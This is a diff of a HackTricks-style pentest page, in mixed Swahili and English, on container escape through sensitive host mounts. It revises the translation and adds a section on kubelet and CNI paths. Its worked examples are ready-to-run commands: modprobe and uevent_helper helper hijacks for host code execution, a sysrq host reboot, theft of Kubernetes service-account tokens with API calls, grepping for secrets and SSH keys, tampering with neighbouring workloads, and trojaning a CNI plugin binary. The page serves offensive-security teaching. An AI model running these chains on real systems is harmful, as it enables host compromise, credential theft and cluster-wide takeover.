@@ -1,18 +1,18 @@
-# Mounts nyeti za mwenyeji
+# Sensitive Host Mounts
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Muhtasari
+## Overview
 
-Host mounts ni miongoni mwa nyuso muhimu zaidi za vitendo za container-escape kwa sababu mara nyingi hukomesha mtazamo uliotengwa wa mchakato na kurudisha hadi mwonekano wa moja kwa moja wa rasilimali za mwenyeji. Matukio hatari hayako tu kwa `/`. Bind mounts za `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, au njia zinazohusiana na device zinaweza kufichua udhibiti wa kernel, credentials, filesystems za container jirani, na interfaces za usimamizi wa runtime.
+Host mounts ni mojawapo ya muhimu zaidi kwa vitendo katika container-escape surfaces kwa sababu mara nyingi hugeuza mwonekano wa process uliotengwa kwa uangalifu kurudi kwenye direct visibility ya host resources. Hali hatari hazijumuishi `/` pekee. Bind mounts za `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, au device-related paths zinaweza kufichua kernel controls, credentials, neighboring container filesystems, na runtime management interfaces.
 
-Ukurasa huu umewekwa kando kutoka kwa kurasa za ulinzi za mtu mmoja mmoja kwa sababu jinsi inavyoweza kutumiwa vibaya inagusa maeneo mbalimbali. Host mount inayoweza kuandikwa ni hatari kwa sehemu kwa sababu ya mount namespaces, kwa sehemu kwa sababu ya user namespaces, kwa sehemu kwa sababu ya kufunikwa kwa AppArmor au SELinux, na kwa sehemu kwa sababu ya njia halisi ya host iliyofichuliwa. Kuichukulia kama mada yake mwenyewe hufanya uso wa shambulio kuwa rahisi kueleweka.
+Ukurasa huu upo tofauti na kurasa binafsi za protection kwa sababu abuse model ni cross-cutting. Writable host mount ni hatari kwa sehemu kwa sababu ya mount namespaces, kwa sehemu kwa sababu ya user namespaces, kwa sehemu kwa sababu ya AppArmor au SELinux coverage, na kwa sehemu kwa sababu ya ni host path gani hasa ilifichuliwa. Kuichukulia kama mada yake yenyewe hufanya attack surface iwe rahisi sana kuielewa.
 
 ## `/proc` Exposure
 
-procfs inajumuisha taarifa za kawaida za mchakato pamoja na interfaces za udhibiti wa kernel zenye athari kubwa. Bind mount kama `-v /proc:/host/proc` au mtazamo wa container unaofichua proc entries zisizotarajiwa zinazoweza kuandikwa unaweza hivyo kusababisha ufunuo wa taarifa, denial of service, au utekelezaji wa moja kwa moja wa code kwenye host.
+procfs ina taarifa za kawaida za process pamoja na high-impact kernel control interfaces. Bind mount kama `-v /proc:/host/proc` au container view inayofichua unexpected writable proc entries inaweza hivyo kusababisha information disclosure, denial of service, au direct host code execution.
 
-High-value procfs paths include:
+High-value procfs paths ni pamoja na:
 
 - `/proc/sys/kernel/core_pattern`
 - `/proc/sys/kernel/modprobe`
@@ -29,9 +29,9 @@ High-value procfs paths include:
 - `/proc/sched_debug`
 - `/proc/[pid]/mountinfo`
 
-### Matumizi mabaya
+### Abuse
 
-Anza kwa kuangalia ni procfs entries za thamani kubwa zipi zinaonekana au zinaweza kuandikwa:
+Anza kwa kuangalia ni zipi high-value procfs entries zinazoonekana au zinaweza kuandikwa:
 ```bash
 for p in \
 /proc/sys/kernel/core_pattern \
@@ -46,47 +46,47 @@ for p in \
 [ -e "$p" ] && ls -l "$p"
 done
 ```
-Njia hizi zinavutia kwa sababu tofauti. `core_pattern`, `modprobe`, na `binfmt_misc` zinaweza kuwa njia za utekelezaji wa msimbo kwenye mwenyeji ikiwa zinaweza kuandikwa. `kallsyms`, `kmsg`, `kcore`, na `config.gz` ni vyanzo vya uchunguzi vyenye nguvu kwa ajili ya kernel exploitation. `sched_debug` na `mountinfo` zinafunua muktadha wa process, cgroup, na filesystem ambao unaweza kusaidia kujenga upya mpangilio wa mwenyeji kutoka ndani ya container.
+These paths are interesting for different reasons. `core_pattern`, `modprobe`, and `binfmt_misc` can become host code-execution paths when writable. `kallsyms`, `kmsg`, `kcore`, and `config.gz` are powerful reconnaissance sources for kernel exploitation. `sched_debug` and `mountinfo` reveal process, cgroup, and filesystem context that can help reconstruct the host layout from inside the container.
 
-Thamani ya vitendo kwa kila njia ni tofauti, na kuzipanga zote kana kwamba zina athari sawa kunafanya triage kuwa ngumu:
+The practical value of each path is different, and treating them all as if they had the same impact makes triage harder:
 
 - `/proc/sys/kernel/core_pattern`
-Ikiwa inaweza kuandikwa, hii ni mojawapo ya njia za procfs zenye athari kubwa kwa sababu kernel itatekeleza pipe handler baada ya crash. Container inayoweza kuelekeza `core_pattern` kwa payload iliyohifadhiwa kwenye overlay yake au katika njia iliyopachikwa ya mwenyeji mara nyingi inaweza kupata utekelezaji wa msimbo kwenye mwenyeji. Tazama pia [read-only-paths.md](protections/read-only-paths.md) kwa mfano maalum.
+If writable, this is one of the highest-impact procfs paths because the kernel will execute a pipe handler after a crash. A container that can point `core_pattern` at a payload stored in its overlay or in a mounted host path can often obtain host code execution. See also [read-only-paths.md](protections/read-only-paths.md) for a dedicated example.
 - `/proc/sys/kernel/modprobe`
-Njia hii inadhibiti userspace helper inayotumika na kernel wakati inahitaji kuendesha module-loading logic. Ikiwa inaweza kuandikwa kutoka container na kutafsiriwa katika muktadha wa mwenyeji, inaweza kuwa primitive nyingine ya utekelezaji wa msimbo kwenye mwenyeji. Inavutia hasa inapoambatana na njia ya kusababisha helper path.
+This path controls the userspace helper used by the kernel when it needs to invoke module-loading logic. If writable from the container and interpreted in the host context, it can become another host code-execution primitive. It is especially interesting when combined with a way to trigger the helper path.
 - `/proc/sys/vm/panic_on_oom`
-Hii kwa kawaida si primitive safi ya kutoroka, lakini inaweza kubadilisha shinikizo la kumbukumbu kuwa denial of service ya mwenyeji nzima kwa kugeuza vigezo vya OOM kuwa tabia ya kernel panic.
+This is not usually a clean escape primitive, but it can convert memory pressure into host-wide denial of service by turning OOM conditions into kernel panic behavior.
 - `/proc/sys/fs/binfmt_misc`
-Ikiwa kiolesura cha usajili kinaweza kuandikwa, mdukuzi anaweza kusajili handler kwa magic value aliyochagua na kupata utekelezaji katika muktadha wa mwenyeji wakati faili inayofanana inapoendeshwa.
+If the registration interface is writable, the attacker may register a handler for a chosen magic value and obtain host-context execution when a matching file is executed.
 - `/proc/config.gz`
-Inafaa kwa triage ya kernel exploit. Inasaidia kubaini ni subsystems gani, mitigations, na vipengele vya hiari vya kernel vimewezeshwa bila kuhitaji metadata ya package za mwenyeji.
+Useful for kernel exploit triage. It helps determine which subsystems, mitigations, and optional kernel features are enabled without needing host package metadata.
 - `/proc/sysrq-trigger`
-Kimsingi njia ya denial-of-service, lakini ni hatari sana. Inaweza ku-reboot, kusababisha panic, au vinginevyo kutatiza mwenyeji mara moja.
+Mostly a denial-of-service path, but a very serious one. It can reboot, panic, or otherwise disrupt the host immediately.
 - `/proc/kmsg`
-Inaonyesha ujumbe za kernel ring buffer. Inafaa kwa host fingerprinting, uchambuzi wa crash, na katika mazingira mengine kwa leaking information ambayo inasaidia kernel exploitation.
+Reveals kernel ring buffer messages. Useful for host fingerprinting, crash analysis, and in some environments for leaking information helpful to kernel exploitation.
 - `/proc/kallsyms`
-Ina thamani wakati inapasuka kusomwa kwa sababu inaonyesha taarifa za exported kernel symbols na inaweza kusaidia kupambana na assumptions za address randomization wakati wa ukuzaji wa kernel exploit.
+Valuable when readable because it exposes exported kernel symbol information and may help defeat address randomization assumptions during kernel exploit development.
 - `/proc/[pid]/mem`
-Hii ni kiolesura cha moja kwa moja kwa kumbukumbu ya process. Ikiwa process lengwa inaweza kufikiwa kwa masharti yanayofanana na ptrace, inaweza kuruhusu kusoma au kubadilisha kumbukumbu ya process nyingine. Athari halisi inategemea sana kwa credentials, `hidepid`, Yama, na vikwazo vya ptrace, hivyo ni njia yenye nguvu lakini yenye masharti.
+This is a direct process-memory interface. If the target process is reachable with the necessary ptrace-style conditions, it may allow reading or modifying another process's memory. The realistic impact depends heavily on credentials, `hidepid`, Yama, and ptrace restrictions, so it is a powerful but conditional path.
 - `/proc/kcore`
-Inaonyesha mtazamo wa aina ya core-image wa kumbukumbu ya mfumo. Faili ni kubwa na ni ngumu kutumia, lakini kama inaweza kusomwa kwa maana, inaonyesha uso wa kumbukumbu wa mwenyeji uliotolewa vibaya.
+Exposes a core-image-style view of system memory. The file is huge and awkward to use, but if it is meaningfully readable it indicates a badly exposed host memory surface.
 - `/proc/kmem` and `/proc/mem`
-Interfaces za raw memory zenye athari kubwa kihistoria. Katika mifumo mingi ya kisasa zimeshativishwa au zimewekewa vikwazo vingi, lakini ikiwa zipo na zinaweza kutumika zinapaswa kuchukuliwa kama ugunduzi muhimu.
+Historically high-impact raw memory interfaces. On many modern systems they are disabled or heavily restricted, but if present and usable they should be treated as critical findings.
 - `/proc/sched_debug`
-Leaks taarifa za scheduling na task ambazo zinaweza kufichua vitambulisho vya process za mwenyeji hata wakati maoni mengine ya process yanaonekana safi zaidi kuliko ilivyotarajiwa.
+Leaks scheduling and task information that may expose host process identities even when other process views look cleaner than expected.
 - `/proc/[pid]/mountinfo`
-Inafaa sana kwa kujenga upya ni wapi container kwa kweli iko kwenye mwenyeji, ni njia zipi zinategemea overlay, na ikiwa mount inayoweza kuandikwa inahusiana na maudhui ya mwenyeji au ni kwa layer ya container pekee.
+Extremely useful for reconstructing where the container really lives on the host, which paths are overlay-backed, and whether a writable mount corresponds to host content or only to the container layer.
 
-Ikiwa `/proc/[pid]/mountinfo` au maelezo ya overlay yanaweza kusomwa, tumia hayo kurejesha njia ya mwenyeji ya filesystem ya container:
+If `/proc/[pid]/mountinfo` or overlay details are readable, use them to recover the host path of the container filesystem:
 ```bash
 cat /proc/self/mountinfo | head -n 50
 mount | grep overlay
 ```
-Amri hizi ni muhimu kwa sababu mbinu kadhaa za host-execution zinahitaji kubadilisha njia ndani ya container kuwa njia inayolingana kutoka kwa mtazamo wa host.
+Amri hizi zinafaa kwa sababu mbinu kadhaa za host-execution zinahitaji kubadili path iliyo ndani ya container kuwa path inayolingana kutoka mtazamo wa host.
 
-### Mfano Kamili: `modprobe` Helper Path Abuse
+### Full Example: `modprobe` Helper Path Abuse
 
-Ikiwa `/proc/sys/kernel/modprobe` inaweza kuandikwa kutoka ndani ya container na helper path inatafsiriwa katika host context, inaweza kupelekwa kwa payload inayodhibitiwa na mshambulizi:
+Ikiwa `/proc/sys/kernel/modprobe` inaweza kuandikwa kutoka kwenye container na helper path inatafsiriwa katika host context, inaweza kuelekezwa upya kwenda payload inayodhibitiwa na mshambuliaji:
 ```bash
 [ -w /proc/sys/kernel/modprobe ] || exit 1
 host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
@@ -98,31 +98,31 @@ chmod +x /tmp/modprobe-payload
 echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
 cat /proc/sys/kernel/modprobe
 ```
-Kichocheo halisi kinategemea lengo na tabia ya kernel, lakini jambo muhimu ni kwamba njia ya helper inayoweza kuandikwa inaweza kuielekeza mwito wa helper wa kernel wa baadaye kwa maudhui ya host-path yanayodhibitiwa na mshambuliaji.
+Kichocheo halisi kinategemea target na tabia ya kernel, lakini jambo muhimu ni kwamba njia ya helper inayoweza kuandikwa inaweza kuelekeza invocation ya baadaye ya kernel helper kwenda kwenye maudhui ya host-path yanayodhibitiwa na mshambuliaji.
 
-### Mfano Kamili: Kernel Recon na `kallsyms`, `kmsg`, na `config.gz`
+### Mfano Kamili: Kernel Recon Kwa `kallsyms`, `kmsg`, Na `config.gz`
 
-Ikiwa lengo ni exploitability assessment badala ya kutoroka papo hapo:
+Kama lengo ni tathmini ya exploitability badala ya immediate escape:
 ```bash
 head -n 20 /proc/kallsyms 2>/dev/null
 dmesg 2>/dev/null | head -n 50
 zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
 ```
-These commands help answer whether useful symbol information is visible, whether recent kernel messages reveal interesting state, and which kernel features or mitigations are compiled in. The impact is usually not direct escape, but it can sharply shorten kernel-vulnerability triage.
+Amri hizi husaidia kujibu kama taarifa muhimu za alama zinaonekana, kama ujumbe wa hivi karibuni wa kernel unafichua hali ya kuvutia, na ni vipengele au mitigations gani za kernel zimejengwa ndani. Athari kwa kawaida si escape ya moja kwa moja, lakini inaweza kufupisha sana kernel-vulnerability triage.
 
-### Mfano Kamili: SysRq Host Reboot
+### Full Example: SysRq Host Reboot
 
 Ikiwa `/proc/sysrq-trigger` inaweza kuandikwa na inafikia host view:
 ```bash
 echo b > /proc/sysrq-trigger
 ```
-Athari ni host reboot ya mara moja. Hii si mfano mpole, lakini inaonyesha wazi kwamba ufichaji wa procfs unaweza kuwa mbaya zaidi kuliko ufichuzi wa taarifa.
+Dhumuni ni reboot ya host mara moja. Huu si mfano wa hila, lakini unaonyesha wazi kwamba kufichuliwa kwa procfs kunaweza kuwa jambo zito zaidi kuliko information disclosure.
 
-## `/sys` Ufichaji
+## `/sys` Exposure
 
-sysfs inaonyesha kiasi kikubwa cha kernel na state za device. Baadhi ya paths za sysfs zinatumika zaidi kwa fingerprinting, wakati nyingine zinaweza kuathiri helper execution, tabia ya device, configuration ya security-module, au state ya firmware.
+sysfs hufichua kiasi kikubwa cha state ya kernel na device. Baadhi ya njia za sysfs husaidia zaidi kwa fingerprinting, ilhali zingine zinaweza kuathiri helper execution, device behavior, security-module configuration, au firmware state.
 
-High-value sysfs paths include:
+Njia za sysfs zenye thamani kubwa ni pamoja na:
 
 - `/sys/kernel/uevent_helper`
 - `/sys/class/thermal`
@@ -132,9 +132,9 @@ High-value sysfs paths include:
 - `/sys/firmware/efi/efivars`
 - `/sys/kernel/debug`
 
-Hizi paths ni muhimu kwa sababu tofauti. `/sys/class/thermal` inaweza kuathiri tabia ya thermal-management na hivyo kuathiri stability ya host katika mazingira yaliyofichuliwa vibaya. `/sys/kernel/vmcoreinfo` inaweza leak crash-dump na kernel-layout information zinazosaidia kwa host fingerprinting ya ngazi ya chini. `/sys/kernel/security` ni interface ya `securityfs` inayotumika na Linux Security Modules, hivyo access isiyotarajiwa huko inaweza expose au kubadilisha state zinazohusiana na MAC. EFI variable paths zinaweza kuathiri firmware-backed boot settings, zikifanya ziwe mbaya zaidi kuliko ordinary configuration files. `debugfs` chini ya `/sys/kernel/debug` ni hatari hasa kwa sababu ni interface iliyoundwa kwa watengenezaji na ina matarajio ya usalama machache zaidi ikilinganishwa na hardened production-facing kernel APIs.
+Njia hizi ni muhimu kwa sababu tofauti. `/sys/class/thermal` inaweza kuathiri thermal-management behavior na hivyo host stability katika mazingira yaliyofichuliwa vibaya. `/sys/kernel/vmcoreinfo` inaweza kuvuja crash-dump na kernel-layout information ambavyo husaidia kwa low-level host fingerprinting. `/sys/kernel/security` ni interface ya `securityfs` inayotumiwa na Linux Security Modules, hivyo access isiyotarajiwa hapo inaweza kufichua au kubadilisha MAC-related state. Njia za EFI variable zinaweza kuathiri firmware-backed boot settings, na kuzifanya kuwa zenye uzito zaidi kuliko ordinary configuration files. `debugfs` chini ya `/sys/kernel/debug` ni hatari hasa kwa sababu kwa makusudi ni developer-oriented interface yenye matarajio machache sana ya usalama kuliko hardened production-facing kernel APIs.
 
-Amri za kuchunguza zinazofaa kwa paths hizi ni:
+Useful review commands for these paths are:
 ```bash
 find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
 find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
@@ -142,17 +142,17 @@ find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
 find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
 cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
 ```
-What makes those commands interesting:
+Ni nini hufanya amri hizo ziwe za kuvutia:
 
-- `/sys/kernel/security` inaweza kufichua ikiwa AppArmor, SELinux, au LSM nyingine inaonekana kwa njia ambayo inapaswa kuwa ya mwenyeji pekee.
-- `/sys/kernel/debug` mara nyingi ni ugunduzi wa kuhuzunisha zaidi katika kundi hili. Ikiwa `debugfs` ime-mounted na inasomwa au inaandikwa, tarajia uso mpana unaoelekezwa kwa kernel ambao hatari yake halisi inategemea debug nodes zilizoamilishwa.
-- EFI variable exposure ni nadra zaidi, lakini ikiwa ipo ina athari kubwa kwa sababu inagusa mipangilio inayoungwa mkono na firmware badala ya mafaili ya kawaida ya runtime.
-- `/sys/class/thermal` hasa inahusiana na utulivu wa mwenyeji na mwingiliano wa vifaa, sio kwa ajili ya kutoroka kwa shell kwa mtindo mzuri.
-- `/sys/kernel/vmcoreinfo` hasa ni chanzo cha host-fingerprinting na uchambuzi wa crash, muhimu kwa kuelewa hali za chini za kernel.
+- `/sys/kernel/security` inaweza kufichua kama AppArmor, SELinux, au LSM nyingine inaonekana kwa njia ambayo ilipaswa kubaki host-only.
+- `/sys/kernel/debug` mara nyingi ndio ugunduzi wa kutisha zaidi katika kundi hili. Ikiwa `debugfs` ime-mountiwa na inaweza kusomwa au kuandikwa, tarajia surface pana inayokabili kernel ambayo hatari yake halisi inategemea debug nodes zilizo enabled.
+- Kufichuliwa kwa EFI variable ni nadra zaidi, lakini ikipatikana ni high impact kwa sababu hugusa mipangilio inayotegemea firmware badala ya files za kawaida za runtime.
+- `/sys/class/thermal` hasa ni muhimu kwa host stability na hardware interaction, si kwa neat shell-style escape.
+- `/sys/kernel/vmcoreinfo` hasa ni chanzo cha host-fingerprinting na crash-analysis, muhimu kwa kuelewa low-level kernel state.
 
-### Mfano Kamili: `uevent_helper`
+### Full Example: `uevent_helper`
 
-Ikiwa `/sys/kernel/uevent_helper` inaandikwa, kernel inaweza kutekeleza helper inayodhibitiwa na mshambuliaji wakati `uevent` inapoamshwa:
+Ikiwa `/sys/kernel/uevent_helper` inaweza kuandikwa, kernel inaweza ku-execute helper inayodhibitiwa na mshambulizi wakati `uevent` inapochochewa:
 ```bash
 cat <<'EOF' > /evil-helper
 #!/bin/sh
@@ -164,13 +164,13 @@ echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
 echo change > /sys/class/mem/null/uevent
 cat /output
 ```
-Sababu inavyofanya kazi ni kwamba helper path hufasiriwa kutoka kwa mtazamo wa mwenyeji (host). Mara inapoamshwa, helper inaendesha katika muktadha wa host badala ya ndani ya container ya sasa.
+Sababu hii inafanya kazi ni kwamba helper path inatafsiriwa kutoka mtazamo wa host. Mara tu inapochochewa, helper huendeshwa katika host context badala ya ndani ya container ya sasa.
 
-## Mfiduo wa `/var`
+## `/var` Exposure
 
-Ku-mount `/var` ya mwenyeji ndani ya container mara nyingi huhesabiwa chini kwa sababu haionekani kuwa ya kustaajabisha kama ku-mount `/`. Kwa vitendo inaweza kutosha kufikia runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens, na filesystem za programu jirani. Kwenye nodes za kisasa, `/var` mara nyingi ndiko kunakoishi hali za container zenye umuhimu mkubwa wa operesheni.
+Mounting host's `/var` ndani ya container mara nyingi hudharauliwa kwa sababu haionekani ya kushangaza kama mounting `/`. Kwa vitendo, inaweza kuwa ya kutosha kufikia runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens, na neighboring application filesystems. Kwenye nodes za kisasa, `/var` mara nyingi ndipo container state iliyo muhimu zaidi kiutendaji huishi kweli.
 
-### Mfano wa Kubernetes
+### Kubernetes Example
 
 Pod yenye `hostPath: /var` mara nyingi inaweza kusoma projected tokens za pods nyingine na overlay snapshot content:
 ```bash
@@ -178,36 +178,86 @@ find /host-var/ -type f -iname '*.env*' 2>/dev/null
 find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
 cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
 ```
-Amri hizi ni muhimu kwa sababu zinajibu ikiwa mount inafichua tu data ya kawaida ya programu au high-impact cluster credentials. Service-account token inayoweza kusomwa inaweza mara moja kubadilisha local code execution kuwa Kubernetes API access.
+Amri hizi zinafaa kwa sababu zinajibu kama mount inaonyesha tu data ya kawaida ya programu au credentials za cluster zenye athari kubwa. service-account token inayoweza kusomwa inaweza mara moja kubadilisha local code execution kuwa Kubernetes API access.
 
-Iwapo token ipo, thibitisha ni nini inaweza kufikia badala ya kuacha kwenye token discovery:
+Ikiwa token ipo, thibitisha inaweza kufikia nini badala ya kuishia tu kwenye token discovery:
 ```bash
 TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
 curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
 ```
-Athari hapa inaweza kuwa kubwa zaidi kuliko ufikiaji wa node ya ndani. Token yenye RBAC mpana inaweza kugeuza `/var` iliyowekwa kuwa chanzo cha kuvunjwa kwa usalama kwa cluster nzima.
+Athari hapa inaweza kuwa kubwa zaidi kuliko local node access. Token yenye broad RBAC inaweza kugeuza `/var` iliyomountiwa kuwa cluster-wide compromise.
 
-### Docker na containerd Mfano
+### Docker And containerd Example
 
-Katika host za Docker data husika mara nyingi huwa chini ya `/var/lib/docker`, wakati kwenye node za Kubernetes zinazoendeshwa na containerd inaweza kuwa chini ya `/var/lib/containerd` au njia maalum za snapshotter:
+Kwenye Docker hosts data muhimu mara nyingi iko chini ya `/var/lib/docker`, wakati kwenye containerd-backed Kubernetes nodes inaweza kuwa chini ya `/var/lib/containerd` au snapshotter-specific paths:
 ```bash
 docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
 find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
 find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
 ```
-Ikiwa ` /var` iliyopachikwa inaonyesha yaliyomo ya snapshot yanayoweza kuandikwa ya workload nyingine, attacker anaweza kubadilisha mafaili ya application, kuweka web content, au kubadilisha startup scripts bila kugusa configuration ya container ya sasa.
+Ikiwa iliyowekwa `/var` inaonyesha maudhui ya snapshot yanayoweza kuandikwa ya workload nyingine, mshambuliaji anaweza kubadilisha faili za application, kupanda web content, au kubadilisha startup scripts bila kugusa current container configuration.
 
-Mawazo maalum ya matumizi mabaya mara yaliyomo ya snapshot yanayoweza kuandikwa yatakapopatikana:
+Mawazo ya matumizi mabaya ya moja kwa moja mara tu maudhui ya snapshot yanayoweza kuandikwa yanapopatikana:
 ```bash
 echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
 grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
 find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
 ```
-Amri hizi ni muhimu kwa sababu zinaonyesha familia tatu kuu za athari za `/var` iliyopachikwa: application tampering, secret recovery, na lateral movement kuelekea workloads jirani.
+Amri hizi ni muhimu kwa sababu zinaonyesha familia tatu kuu za athari za mounts za `/var`: application tampering, secret recovery, na lateral movement kwenda kwenye workloads jirani.
 
-## Sockets za runtime
+## Kubelet State, Plugins, And CNI Paths
 
-Mounts nyeti za mwenyeji mara nyingi zinajumuisha sockets za runtime badala ya saraka kamili. Hizi ni muhimu sana kiasi kwamba zinastahili kurudiwa hapa waziwazi:
+Mount ya `/var/lib/kubelet`, `/opt/cni/bin`, au `/etc/cni/net.d` mara nyingi huonekana kupitia privileged DaemonSets, CNI agents, CSI node plugins, GPU operators, na storage helpers. Mounts hizi ni rahisi kupuuzwa kama "node plumbing", lakini ziko moja kwa moja katika execution path ya pods mpya na mara nyingi huwa na kubelet credentials, projected secrets, registration sockets, na executable host-side plugin binaries.
+
+High-value targets ni pamoja na:
+
+- `/var/lib/kubelet/pki`
+- `/var/lib/kubelet/pods`
+- `/var/lib/kubelet/device-plugins/kubelet.sock`
+- `/var/lib/kubelet/pod-resources/kubelet.sock`
+- `/var/lib/kubelet/plugins`
+- `/var/lib/kubelet/plugins_registry`
+- `/opt/cni/bin`
+- `/etc/cni/net.d`
+
+Useful review commands are:
+```bash
+find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
+egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
+ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
+find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
+grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
+```
+Kwa nini paths hizi ni muhimu:
+
+- `/var/lib/kubelet/pki` inaweza kufichua kubelet client certificates na nyingine node-local credentials ambazo wakati mwingine zinaweza kutumika tena dhidi ya API server au kubelet-facing TLS endpoints, kutegemea design ya cluster.
+- `/var/lib/kubelet/pods` mara nyingi huwa na projected service-account tokens na mounted Secrets za neighboring pods kwenye node ile ile.
+- `/var/lib/kubelet/pod-resources/kubelet.sock` hasa ni reconnaissance surface, lakini yenye manufaa sana: inaonyesha ni pods na containers gani kwa sasa zinamiliki GPUs, hugepages, SR-IOV devices, na scarce node-local resources nyingine.
+- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, na `/var/lib/kubelet/plugins_registry` zinaonyesha ni CSI, DRA, na device plugins zipi zimewekwa na sockets zipi kubelet inatarajiwa kuzungumza nazo. Ikiwa directories hizo zinaweza kuandikwa badala ya kusomwa tu, finding inakuwa serious zaidi sana.
+- `/opt/cni/bin` na `/etc/cni/net.d` ziko moja kwa moja kwenye njia ya pod-network setup. Writable access hapo mara nyingi ni delayed host-execution primitive kuliko exposure ya configuration tu.
+
+### Full Example: Writable `/opt/cni/bin`
+
+If a host CNI binary directory is mounted read-write, replacing a plugin can be enough to obtain host execution the next time the kubelet creates a pod sandbox on that node:
+```bash
+plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
+grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
+[ -n "$plugin" ] || exit 1
+mv "$plugin" "${plugin}.orig"
+cat <<'EOF' > "$plugin"
+#!/bin/sh
+id > /tmp/cni-triggered
+exec "$(dirname "$0")/$(basename "$0").orig" "$@"
+EOF
+chmod +x "$plugin"
+echo "wait for the next pod scheduled on this node"
+```
+Hii si ya haraka kama `docker.sock` iliyowekwa, lakini mara nyingi ni halisi zaidi katika compromised Kubernetes infrastructure pods. Jambo muhimu ni kwamba binary iliyobadilishwa baadaye inaendeshwa na host network setup flow, si na current container.
+
+
+## Runtime Sockets
+
+Sensitive host mounts mara nyingi hujumuisha runtime sockets badala ya directories kamili. Hizi ni muhimu sana kiasi kwamba zinastahili kurudiwa wazi hapa:
 ```text
 /run/containerd/containerd.sock
 /var/run/crio/crio.sock
@@ -216,7 +266,7 @@ Mounts nyeti za mwenyeji mara nyingi zinajumuisha sockets za runtime badala ya s
 /var/run/kubelet.sock
 /run/firecracker-containerd.sock
 ```
-Angalia [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) kwa full exploitation flows mara tu moja ya sockets hizi itakapowekwa.
+Tazama [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) kwa mtiririko kamili wa exploitation mara tu moja ya hizi sockets inapowekwa.
 
 Kama muundo wa haraka wa mwingiliano wa kwanza:
 ```bash
@@ -224,32 +274,40 @@ docker -H unix:///host/run/docker.sock version 2>/dev/null
 ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
 crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
 ```
-Ikiwa mojawapo ya hizi itafanikiwa, njia kutoka "mounted socket" hadi "start a more privileged sibling container" kawaida huwa fupi zaidi kuliko njia yoyote ya kernel breakout.
+If one of these succeeds, njia kutoka kwa "mounted socket" hadi "start a more privileged sibling container" kwa kawaida ni fupi zaidi kuliko njia yoyote ya kernel breakout.
 
-## CVE zinazohusiana na mounts
+## Mount-Related CVEs
 
-Host mounts pia zinaungana na udhaifu wa runtime. Mifano muhimu ya hivi karibuni ni:
+Host mounts pia huingiliana na runtime vulnerabilities. Mifano muhimu ya hivi karibuni ni pamoja na:
 
 - `CVE-2024-21626` katika `runc`, ambapo leaked directory file descriptor inaweza kuweka working directory kwenye host filesystem.
-- `CVE-2024-23651` na `CVE-2024-23653` katika BuildKit, ambapo OverlayFS copy-up races zinaweza kusababisha host-path writes wakati wa builds.
-- `CVE-2024-1753` katika Buildah na Podman build flows, ambapo crafted bind mounts wakati wa build zinaweza kufichua `/` kuwa read-write.
-- `CVE-2024-40635` katika containerd, ambapo value kubwa ya `User` inaweza kusababisha overflow hadi tabia ya UID 0.
+- `CVE-2024-23651`, `CVE-2024-23652`, na `CVE-2024-23653` katika BuildKit, ambapo malicious Dockerfiles, frontends, na `RUN --mount` flows zinaweza kureintroduce host file access, deletion, au elevated privileges during builds.
+- `CVE-2024-1753` katika Buildah na Podman build flows, ambapo crafted bind mounts during build zinaweza kuweka `/` read-write.
+- `CVE-2025-47290` katika `containerd` 2.1.0, ambapo TOCTOU wakati wa image unpack inaweza kuruhusu specially crafted image kubadilisha host filesystem during pull.
 
-Hizi CVE zinatofautiana hapa kwa sababu zinaonyesha kwamba utunzaji wa mounts sio tu kuhusu usanidi wa operator. Runtime yenyewe pia inaweza kuanzisha mount-driven escape conditions.
+Hizi CVEs ni muhimu hapa kwa sababu zinaonyesha kwamba mount handling si tu kuhusu operator configuration. Runtime yenyewe pia inaweza kuleta mount-driven escape conditions.
 
 ## Checks
 
-Tumia amri hizi kupata kwa haraka mount exposures zenye thamani kubwa:
+Tumia amri hizi ili kutambua haraka mount exposures zenye thamani ya juu zaidi:
 ```bash
 mount
